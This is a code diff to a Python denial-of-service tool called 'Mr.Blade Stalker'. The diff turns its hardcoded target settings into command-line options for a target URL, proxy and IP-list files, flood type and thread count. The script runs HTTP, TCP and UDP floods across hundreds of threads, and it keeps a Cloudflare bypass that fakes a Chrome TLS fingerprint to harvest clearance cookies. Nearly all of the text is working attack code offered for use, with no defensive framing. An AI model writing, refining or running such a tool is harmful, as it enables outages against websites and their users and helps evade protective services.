@@ -1,3 +1,4 @@
+import argparse
 import requests
 import random
 import threading
@@ -23,16 +24,36 @@ def print_banner():
 """
     print(f"\033[91m{banner}\033[0m")
 
-# Target Configuration
-TARGET_URL = "http://example.com"
-TARGET_IP = "1.1.1.1"
-TARGET_PORT = 443
-THREADS = 500
+# Parse Command-line Arguments
+parser = argparse.ArgumentParser(description="Mr.Blade Stalker DDoS Tool")
+parser.add_argument("-u", "--url", help="Target website URL", required=True)
+parser.add_argument("-p", "--proxy", help="Proxy file path (optional)", default=None)
+parser.add_argument("-i", "--iplist", help="IP list file (optional)", default=None)
+parser.add_argument("-t", "--type", choices=["http", "tcp", "udp"], help="Flood Type: http/tcp/udp", required=True)
+parser.add_argument("-th", "--threads", type=int, help="Number of threads (default: 500)", default=500)
+args = parser.parse_args()
 
-# Proxy List
-PROXY_LIST = ["socks5://127.0.0.1:9050", "http://45.76.1.23:8080", "socks5://192.168.1.100:1080"]
+# Load Proxies from File
+PROXY_LIST = []
+if args.proxy:
+    try:
+        with open(args.proxy, "r") as f:
+            PROXY_LIST = [line.strip() for line in f.readlines()]
+        print(f"\033[92m[✔] Loaded {len(PROXY_LIST)} Proxies from {args.proxy}\033[0m")
+    except Exception as e:
+        print(f"\033[91m[!] Proxy File Error: {e}\033[0m")
 
-# User-Agents & Referers
+# Load Target IPs from File
+TARGET_IPS = []
+if args.iplist:
+    try:
+        with open(args.iplist, "r") as f:
+            TARGET_IPS = [line.strip() for line in f.readlines()]
+        print(f"\033[92m[✔] Loaded {len(TARGET_IPS)} Target IPs from {args.iplist}\033[0m")
+    except Exception as e:
+        print(f"\033[91m[!] IP List File Error: {e}\033[0m")
+
+# User-Agent & Referers
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -43,8 +64,8 @@ REFERERS = ["https://google.com", "https://bing.com", "https://yahoo.com"]
 # Cloudflare Bypass - Cookie Extraction
 def get_cloudflare_cookies():
     try:
-        session = Session(client_identifier="chrome_120")  # TLS Fingerprint Evasion
-        response = session.get(TARGET_URL)
+        session = Session(client_identifier="chrome_120")
+        response = session.get(args.url)
         cookies = session.cookies.get_dict()
         if "cf_clearance" in cookies:
             print(f"\033[92m[✔] Cloudflare Bypassed | Clearance Cookie: {cookies['cf_clearance']}\033[0m")
@@ -53,25 +74,7 @@ def get_cloudflare_cookies():
         print(f"\033[91m[!] Cloudflare Bypass Error: {e}\033[0m")
         return {}
 
-# Cloudflare Challenge Solving
-def solve_cloudflare_challenge():
-    try:
-        options = Options()
-        options.add_argument("--headless")
-        driver = webdriver.Chrome(options=options)
-        driver.get(TARGET_URL)
-        time.sleep(6)  # Wait for Cloudflare to verify browser
-        cookies = driver.get_cookies()
-        driver.quit()
-        for cookie in cookies:
-            if cookie["name"] == "cf_clearance":
-                print(f"\033[92m[✔] Cloudflare Challenge Solved | Clearance Cookie: {cookie['value']}\033[0m")
-                return {cookie["name"]: cookie["value"]}
-    except Exception as e:
-        print(f"\033[91m[!] Cloudflare Challenge Error: {e}\033[0m")
-        return {}
-
-# HTTP Flood Attack with Cloudflare Bypass
+# HTTP Flood Attack
 def http_flood():
     cf_cookies = get_cloudflare_cookies()
     while True:
@@ -81,7 +84,7 @@ def http_flood():
                 "Referer": random.choice(REFERERS),
                 "Cache-Control": "no-cache",
             }
-            response = requests.get(TARGET_URL, headers=headers, cookies=cf_cookies, timeout=5)
+            response = requests.get(args.url, headers=headers, cookies=cf_cookies, timeout=5)
             print(f"\033[92m[✔] HTTP Flood -> Status: {response.status_code}\033[0m")
         except Exception as e:
             print(f"\033[91m[!] HTTP Flood Error: {e}\033[0m")
@@ -90,11 +93,12 @@ def http_flood():
 def tcp_flood():
     while True:
         try:
+            target_ip = random.choice(TARGET_IPS) if TARGET_IPS else args.url
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((TARGET_IP, TARGET_PORT))
-            payload = os.urandom(1024)  # Random Data
+            s.connect((target_ip, 443))
+            payload = os.urandom(1024)
             s.send(payload)
-            print(f"\033[92m[✔] TCP Flood -> Sent {len(payload)} bytes to {TARGET_IP}:{TARGET_PORT}\033[0m")
+            print(f"\033[92m[✔] TCP Flood -> Sent {len(payload)} bytes to {target_ip}:443\033[0m")
             s.close()
         except Exception as e:
             print(f"\033[91m[!] TCP Flood Error: {e}\033[0m")
@@ -103,35 +107,28 @@ def tcp_flood():
 def udp_flood():
     while True:
         try:
+            target_ip = random.choice(TARGET_IPS) if TARGET_IPS else args.url
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = os.urandom(1024)  # Random Data
-            s.sendto(payload, (TARGET_IP, TARGET_PORT))
-            print(f"\033[92m[✔] UDP Flood -> Sent {len(payload)} bytes to {TARGET_IP}:{TARGET_PORT}\033[0m")
+            payload = os.urandom(1024)
+            s.sendto(payload, (target_ip, 443))
+            print(f"\033[92m[✔] UDP Flood -> Sent {len(payload)} bytes to {target_ip}:443\033[0m")
         except Exception as e:
             print(f"\033[91m[!] UDP Flood Error: {e}\033[0m")
 
 # Multi-threaded Execution
 def start_attack():
-    print_banner()  # Display Banner First
-    print("\033[91m[!] Launching Mr.Blade Stalker Attack with Cloudflare Bypass...\033[0m")
+    print_banner()
+    print(f"\033[91m[!] Launching Mr.Blade Stalker Attack on {args.url} with {args.threads} threads...\033[0m")
 
-    # Get Cloudflare Cookies
-    cf_cookies = get_cloudflare_cookies()
-
-    # Challenge Solving
-    threading.Thread(target=solve_cloudflare_challenge).start()
-
-    # Launch HTTP Flood with Cloudflare Bypass
-    for _ in range(THREADS // 3):
-        threading.Thread(target=http_flood).start()
-
-    # Launch TCP Flood
-    for _ in range(THREADS // 3):
-        threading.Thread(target=tcp_flood).start()
-
-    # Launch UDP Flood
-    for _ in range(THREADS // 3):
-        threading.Thread(target=udp_flood).start()
+    if args.type == "http":
+        for _ in range(args.threads):
+            threading.Thread(target=http_flood).start()
+    elif args.type == "tcp":
+        for _ in range(args.threads):
+            threading.Thread(target=tcp_flood).start()
+    elif args.type == "udp":
+        for _ in range(args.threads):
+            threading.Thread(target=udp_flood).start()
 
 if __name__ == "__main__":
     start_attack()
